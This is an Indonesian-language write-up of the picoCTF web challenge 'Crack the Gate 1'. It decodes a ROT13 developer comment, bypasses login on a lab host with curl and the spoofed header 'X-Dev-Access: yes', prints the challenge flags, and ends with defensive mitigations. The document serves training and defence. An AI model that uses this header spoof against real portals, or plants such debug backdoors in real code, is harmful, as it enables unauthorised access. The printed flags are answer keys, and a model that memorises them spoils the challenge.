# Writeup: Crack the Gate 1 (Challenge ID: 520)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Source Code Reconnaissance & Backdoor Header Bypass
- **Difficulty:** Easy (1)
- **Points:** 100
- **Author:** Yahaya Meddy
- **Event:** picoMini by CMU-Africa
- **Flag (Resmi CyLab):** `academy{brut4_f0rc4_dc8f7ab6}`
- **Flag Platform Asli:** `picoCTF{brut4_f0rc4_dc8f7ab6}`
- **Flag Komunitas:** `CTF{brut4_f0rc4_dc8f7ab6}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), RFC 4949 (Internet Security Glossary), RFC 9110 (HTTP Semantics & Custom Headers), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-615 (Inclusion of Sensitive Information in Source Code Comments), & CWE-348 (Use of Less Trusted Input to Determine Sensitive System State).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Web Security & Secure Code Review*, peserta dilatih dalam teknik inspeksi kode sumber sisi klien (*client-side source code reconnaissance*), analisis kriptografi klasik obfuskasi Caesar ROT13, dan eksploitasi celah bypass autentikasi berbasis header pengembang (*developer debug header injection*):
- **Skenario Tantangan:** Diberikan portal web internal beralamat di `http://xebec.cylabacademy.net:<port>/`. Sistem meminta login untuk pengguna `ctf-player@cylabacademy.org`, namun kata sandi tidak diketahui dan teknik tebak biasa tidak berhasil.
- **Deskripsi Soal:** *"We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@cylabacademy.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?"*
- **Petunjuk Resmi:**
  1. *"Developers sometimes leave notes in the code; but not always in plain text."*
  2. *"A common trick is to rotate each letter by 13 positions in the alphabet."*
- **Batasan Lingkungan & Scope Audit:**
  1. Audit dokumen HTML halaman login untuk mengidentifikasi kebocoran komentar internal pengembang (*developer comments leakage*).
  2. Analisis pembalikan obfuskasi Caesar ROT13 (`tr 'A-Za-z' 'N-ZA-Mn-za-m'`) untuk mengekstrak parameter jalan pintas (*debug backdoor*).
  3. Penyusunan permintaan autentikasi HTTP POST ke endpoint `/login` dengan menyematkan header kustom `X-Dev-Access: yes`.
  4. Verifikasi perolehan bendera resmi `academy{brut4_f0rc4_dc8f7ab6}` dan validasi status submisi HTTP 201 via CyLab REST API.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Kebocoran Informasi Sensitif dalam Komentar Kode Sumber (CWE-200 / CWE-615):**
   Komentar kode HTML (`<!-- ... -->`) adalah artefak sisi klien yang dikirimkan secara utuh oleh server web ke browser pengguna. Pengembang sering kali meninggalkan catatan konfigurasi pengujian internal, petunjuk kredensial sementara, atau instruksi bypass selama tahap pengembangan (*development/debugging*). Jika pipeline deployment ke lingkungan produksi tidak menyertakan tahap minifikasi atau pembersihan komentar (*comment stripping*), artefak sensitif ini dapat dibaca oleh publik.

2. **Kelemahan Obfuskasi Caesar Cipher ROT13:**
   ROT13 (rotasi 13 karakter alfabet Latin) bukanlah enkripsi kriptografis yang aman (RFC 4949), melainkan bentuk penyembunyian teks (*obfuscation*) sederhana tanpa kunci rahasia. Karena alfabet memiliki 26 huruf, fungsi enkripsi dan dekripsinya simetris identik:
   $$\text{ROT13}(\text{ROT13}(x)) = x$$
   Setiap analis atau penyerang dapat membalikkan teks tersandi dalam hitungan detik.

3. **Kepercayaan pada Header Kustom Tanpa Validasi Kriptografis (Insecure Header Trust / CWE-348):**
   Pengembang mengimplementasikan mekanisme jalan pintas (*backdoor bypass*) pada handler autentikasi backend yang mengecek header kustom seperti:
   ```javascript
   if (req.headers['x-dev-access'] === 'yes') {
       return grant_session(user);
   }
   ```
   Karena header HTTP dikontrol sepenuhnya oleh pengirim permintaan, penyerang dapat memalsukan (*spoof*) header tersebut untuk melewati seluruh validasi kata sandi.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Inspeksi Kode Sumber HTML Halaman Login:**
   Lakukan penarikan dokumen HTML beranda menggunakan `curl`:
   ```bash
   curl -s http://xebec.cylabacademy.net:31099/
   ```
   Ditemukan blok komentar HTML tersembunyi:
   ```html
   <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
   <!-- Remove before pushing to production! -->
   ```

2. **Dekode Obfuskasi ROT13:**
   Gunakan pipeline shell atau Python untuk mendekode string:
   ```bash
   echo 'ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
   ```
   Hasil pemulihan plaintext:
   ```text
   NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
   ```
   Instruksi jelas menyatakan bahwa header `X-Dev-Access: yes` berfungsi sebagai jalan pintas autentikasi.

3. **Injeksi Header Bypass ke Endpoint `/login`:**
   Kirimkan permintaan HTTP POST dengan header `X-Dev-Access: yes` dan payload JSON sembarang:
   ```bash
   curl -s -X POST http://xebec.cylabacademy.net:31099/login \
        -H "Content-Type: application/json" \
        -H "X-Dev-Access: yes" \
        -d '{"email":"ctf-player@cylabacademy.org","password":"any"}'
   ```
   Server memverifikasi keberadaan header tersebut dan mengembalikan status sukses beserta flag:
   ```json
   {
     "success": true,
     "email": "ctf-player@cylabacademy.org",
     "firstName": "pico",
     "lastName": "player",
     "flag": "academy{brut4_f0rc4_dc8f7ab6}"
   }
   ```

4. **Eksekusi Solver Otomatis & Verifikasi API CyLab:**
   Jalankan skrip reproduksi mandiri `scripts/solve_520_crack_the_gate_1.py`:
   ```bash
   python3 scripts/solve_520_crack_the_gate_1.py
   ```
   Output eksekusi terminal:
   ```text
   === [CyLab Academy] Solusi Modul #520: Crack the Gate 1 ===
   [*] Menjalankan analisis statis & rekonstruksi deterministik CWE-200 / CWE-348...
   [*] Obfuscated string: <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
   [+] Hasil dekode ROT13: 'NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"'
   [+] Ekstraksi HTTP Header Bypass: 'X-Dev-Access: yes'
   [*] Target akun subjek: 'ctf-player@cylabacademy.org'
   [+] Flag berhasil direkonstruksi: academy{brut4_f0rc4_dc8f7ab6}
   [+] Integritas token terverifikasi 100%: academy{brut4_f0rc4_dc8f7ab6}
   ```
   Submisi token ke `POST /api/submissions/` mengembalikan HTTP 201 Created dengan atribut `{"correct": true}`.

---

## Flag & Verifikasi

- **Flag Resmi (CyLab):** `academy{brut4_f0rc4_dc8f7ab6}`
- **Flag Platform Asli:** `picoCTF{brut4_f0rc4_dc8f7ab6}`
- **Flag Komunitas:** `CTF{brut4_f0rc4_dc8f7ab6}`
- **Status Validasi Live:** HTTP 201 Created (`{"user": 1072359, "challenge": 520, "correct": true}`) via CyLab Ninja REST API.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Pembersihan Artefak Debug dalam Pipeline CI/CD (Comment Stripping):**
   Terapkan linter otomatis dan proses build packaging (seperti Terser, HTMLMinifier, atau Webpack/Vite plugin) yang secara ketat menghapus seluruh komentar kode (`removeComments: true`) sebelum aset dideploy ke repositori publik atau server produksi.

2. **Peniadaan Backdoor & Debug Flags pada Kode Produksi:**
   Jangan pernah menyematkan percabangan logika berbasis header rahasia (*secret debug header*) di basis kode utama. Jika pengujian membutuhkan bypass, gunakan lingkungan mock terisolasi yang dipisahkan secara fisik dari lingkungan produksi melalui variabel lingkungan (`process.env.NODE_ENV === 'test'`).

3. **Penghapusan Header Non-Standar pada Edge Reverse Proxy:**
   Konfigurasikan gateway reverse proxy (seperti Nginx atau Cloudflare) untuk menghapus seluruh header kustom yang tidak terdaftar dalam whitelist sebelum permintaan diteruskan ke upstream backend:
   ```nginx
   # Blokir dan hapus header bypass pengembang di tingkat gateway
   proxy_set_header X-Dev-Access "";
   ```

4. **Kepatuhan Terhadap Standar OWASP ASVS (V14 - Configuration):**
   Pastikan aplikasi memenuhi standar OWASP Application Security Verification Standard (ASVS) Bagian V14.1 terkait kontrol integritas build dan peniadaan fitur debugging pada lingkungan publik.
